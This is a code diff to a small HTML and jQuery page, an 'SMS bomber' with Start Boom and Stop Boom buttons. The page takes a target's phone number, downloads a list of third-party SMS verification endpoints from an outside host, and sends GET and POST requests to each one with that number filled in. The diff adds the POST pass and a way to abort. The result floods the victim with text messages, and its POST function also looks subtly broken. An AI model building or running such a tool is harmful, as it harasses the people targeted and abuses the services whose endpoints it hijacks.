@@ -7,6 +7,18 @@
     <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
     <script>
         //var phoneNumber = $("#phoneNumber").val();
+        let ajaxRequest;
+        $(document).ready(function () {
+            $("#stopButton").click(function () { 
+                console.log(6);
+
+                if (ajaxRequest) {
+                ajaxRequest.abort();
+                console.log(ajaxRequest.abort());
+            }
+            })
+        })
+
         var str = "";
         $(document).ready(function () {
             $("#sendSMS").click(function () {
@@ -25,13 +37,31 @@
                         //alert("短信已发送！");
                         console.log(response);
                         try {
-                            response = JSON.parse(response)
-                        } catch (error) {
-                            
-                        }
+                            response = JSON.parse(response);
+                        } catch (error) { }
                         for (let i = 0; i < response.length; i++) {
+                            await SMSBoomGET(response[i], str);
+                        }
+                    },
+                    error: function () {
+                        //alert("发送短信时出错！");
+                        console.log();
+                    },
+                });
 
-                            await SMSBoom(response[i], str);
+                $.ajax({
+                    url: `https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json`, // 发送短信的后端处理文件
+                    method: "GET",
+                    //data: { phoneNumber: phoneNumber },
+                    success: async function (response) {
+
+                        //alert("短信已发送！");
+                        console.log(response);
+                        try {
+                            response = JSON.parse(response);
+                        } catch (error) { }
+                        for (let i = 0; i < response.length; i++) {
+                            await SMSBoomPOST(response[i], str);
                         }
                     },
                     error: function () {
@@ -41,21 +71,43 @@
                 });
             });
         });
-        function SMSBoom(api, phoneNumber) {
+        function SMSBoomGET(api, phoneNumber) {
             //console.log(api);
             let url = api.replaceAll("[phone]", phoneNumber);
-            $.ajax({
+            ajaxRequest = $.ajax({
                 url: url, // 发送短信的后端处理文件
                 method: "GET",
                 //data: { phoneNumber: phoneNumber },
-                success: function (response) {
+                success: async function (response) {
+                    if (ajaxRequest && ajaxRequest.statusText === "abort") {
+                        return; // 停止请求
+                    }
                     //alert("短信已发送！");
                     console.log("短信已发送！");
                     //console.log(response);
                 },
-                error: function () {
+                error: async function () {
+                    if (ajaxRequest && ajaxRequest.statusText === "abort") {
+                        return; // 停止请求
+                    }
                     //alert("发送短信时出错！");
                     console.log(`发送短信时出错！`);
+                },
+            });
+        }
+        function SMSBoomPOST(api, phoneNumber) {
+            api = api.replaceAll("[phone]", phoneNumber);
+            $.ajax({
+                api,
+                //data: { phoneNumber: phoneNumber },
+                success: function (response) {
+                    //alert("短信已发送！");
+                    console.log("POST短信已发送！");
+                    //console.log(response);
+                },
+                error: function () {
+                    //alert("发送短信时出错！");
+                    console.log(`POST发送短信时出错！`);
                 },
             });
         }
@@ -66,6 +118,8 @@
     <label for="phoneNumber">手机号码：</label>
     <input type="text" id="phoneNumber" name="phoneNumber" placeholder="请输入手机号码" />
     <button id="sendSMS">Start Boom</button>
+    <button id="stopButton">Stop Boom</button>
+
 </body>
 
 </html>
